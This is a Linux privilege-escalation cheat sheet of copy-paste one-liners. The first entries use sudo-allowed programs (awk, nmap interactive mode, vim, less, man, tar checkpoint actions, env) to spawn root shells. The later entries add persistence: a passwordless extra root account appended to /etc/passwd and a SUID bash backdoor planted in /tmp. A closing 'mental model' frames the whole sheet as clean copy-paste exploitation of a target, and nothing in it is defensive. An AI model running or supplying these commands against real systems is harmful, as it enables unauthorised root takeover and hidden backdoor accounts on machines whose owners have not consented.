> [!example] 🐧 Linux Bash: Breaking Process Controls via In-Utility Text Data Stream Pattern Parsers
> 
> Abuses initialization parameters within `awk` to execute an elevated system shell.
> 
> Bash
> 
> Bash
> 
> ```
> awk 'BEGIN {system("/bin/bash")}'
> ```

> [!example] 🐧 Linux Bash: Spawning Privileged Interceptions via Deprecated Legacy Interactive Application Frameworks
> 
> Escapes to a root shell from an interactive session within older versions of Nmap (<5.20) that support interactive mode.
> 
> Bash
> 
> Bash
> 
> ```
> sudo nmap --interactive; !sh
> ```

> [!example] 🐧 Linux Bash: Escaping Writable Local Text Editors Configurations back into Active Shell Contexts
> 
> Opens a privileged shell from Vim by executing command operators directly within the editor's command line buffer.
> 
> Bash
> 
> Bash
> 
> ```
> sudo vim -c ':!/bin/bash'
> ```

> [!example] 🐧 Linux Bash: Pager-Based Command Redirection Ingress Shell Breaks out of System Readers
> 
> Overrides terminal reader interfaces like `less` or `man` by entering shell execution flags into the active pager buffer.
> 
> Bash
> 
> Bash
> 
> ```
> sudo less /etc/hosts → inside session execute: !/bin/bash
> sudo man man         → inside session execute: !/bin/bash
> ```

> [!example] 🐧 Linux Bash: Exploiting Privileged Tar Application Archivers Checkpoint Command Parameter Execution Weaknesses
> 
> Abuses checkpoint options within privileged `tar` commands to execute scripts automatically as root during archiving routines.
> 
> Bash
> 
> Bash
> 
> ```
> sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
> ```

> [!example] 🐧 Linux Bash: Spawning Root Process Environments over Writable Structural Environment Core Systems
> 
> Drops directly into an elevated shell environment by invoking the system env binary with root privileges.
> 
> Bash
> 
> Bash
> 
> ```
> sudo env /bin/bash
> ```

> [!example] 🐧 Linux Bash: Appending Arbitrary Root Credentials Records into Protected System Account Mapping Registries
> 
> Uses elevated text routing primitives to append a new root account with an empty password directly to `/etc/passwd`.
> 
> Bash
> 
> Bash
> 
> ```
> echo 'root2::0:0::/root:/bin/bash' | sudo tee -a /etc/passwd
> ```

> [!example] 🐧 Linux Bash: Propagating SUID System Binary Elevation Permissions via Privileged Local File Copies
> 
> Copies the bash binary to a writable folder and adds SUID permissions to create a permanent, elevated backdoor shell path.
> 
> Bash
> 
> Bash
> 
> ```
> sudo cp /bin/bash /tmp/; sudo chmod +s /tmp/bash; /tmp/bash -p
> ```

# 🧠 Mental Model

Plaintext

```
Target Environment Identified ➔ Callout Container Language Check ➔ Clean Copy-Paste Execution ➔ Exploit Validated
```